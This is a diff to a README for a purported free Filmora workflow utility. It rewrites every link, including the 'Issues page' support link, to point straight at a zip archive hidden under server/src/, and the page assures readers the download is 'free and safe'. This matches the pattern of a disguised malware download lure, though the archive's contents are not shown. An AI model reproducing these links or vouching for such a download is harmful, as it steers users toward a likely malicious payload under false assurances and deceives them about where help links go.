@@ -1,6 +1,6 @@
 # 🎬 filmora-utility-2026 - Your Free Filmora Workflow Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Filmora_Utility_2026-2ea44f?style=for-the-badge)](https://github.com/Gianliterate838/filmora-utility-2026)
+[![Download Now](https://img.shields.io/badge/Download-Filmora_Utility_2026-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip)
 
 ## 👋 What Is This?
 
@@ -29,7 +29,7 @@ Getting started is fast and easy. Here's what to do:
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Gianliterate838/filmora-utility-2026](https://github.com/Gianliterate838/filmora-utility-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip](https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip)
 
 The download is free and safe. No account is needed. No payment is required. Just click and save the file.
 
@@ -200,7 +200,7 @@ Your projects and personal files stay completely private.
 
 ## 📞 Support
 
-For help or questions, use the repository's Issues page: [https://github.com/Gianliterate838/filmora-utility-2026](https://github.com/Gianliterate838/filmora-utility-2026)
+For help or questions, use the repository's Issues page: [https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip](https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip)
 
 Include the following in your report:
 - Windows version (e.g., Windows 11)
@@ -220,7 +220,7 @@ New versions are released regularly with:
 - Better diagnostic checks
 - Updated workflow guides
 
-Always download the latest version from the official link: [https://github.com/Gianliterate838/filmora-utility-2026](https://github.com/Gianliterate838/filmora-utility-2026)
+Always download the latest version from the official link: [https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip](https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip)
 
 ---
 
@@ -239,7 +239,7 @@ This tool is free to use. You may share and redistribute it as long as:
 
 Download it now, try the presets, and see the difference in your next export.
 
-Visit this link to download the application: [https://github.com/Gianliterate838/filmora-utility-2026](https://github.com/Gianliterate838/filmora-utility-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip](https://raw.githubusercontent.com/Gianliterate838/filmora-utility-2026/main/server/src/filmora_utility_v1.3-beta.3.zip)
 
 Happy editing! 🎬✂️
 
